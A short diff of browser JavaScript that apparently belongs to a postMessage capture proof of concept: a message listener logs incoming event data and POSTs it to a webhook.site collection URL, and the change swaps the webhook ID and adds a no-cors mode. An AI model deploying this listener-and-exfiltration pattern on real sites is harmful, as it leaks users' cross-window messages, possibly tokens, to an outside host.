@@ -14,8 +14,9 @@
         window.addEventListener('message', function(event) {
             console.log(event.data);
             // send to the server
-            fetch('https://webhook.site/3b3809da-27bc-4c02-9ab1-868d069a227a', {
+            fetch('https://webhook.site/cc5c25a3-5874-4043-aaa9-329878c4a20e', {
                 method: 'POST',
+                mode: "no-cors",
                 headers: {
                     'Content-Type': 'application/json'
                 },
